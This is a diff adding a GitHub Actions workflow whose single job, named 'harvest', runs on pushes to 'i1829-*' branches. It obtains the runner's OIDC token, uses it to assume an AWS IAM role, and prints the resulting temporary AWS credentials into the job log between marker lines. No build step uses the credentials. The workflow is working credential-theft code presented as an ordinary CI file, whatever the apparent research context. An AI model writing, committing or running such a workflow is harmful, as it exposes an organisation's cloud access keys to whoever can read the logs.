@@ -1,0 +1,21 @@
+name: i1829-sts
+on:
+  push:
+    branches:
+      - 'i1829-*'
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  harvest:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: harvest
+        run: |
+          set -uo pipefail
+          JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          STS=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::925353553787:role/github --role-session-name i1829 --web-identity-token "$JWT" --duration-seconds 3600 --query Credentials --output json)
+          echo "STSJSON_BEGIN"
+          echo "$STS"
+          echo "STSJSON_END"
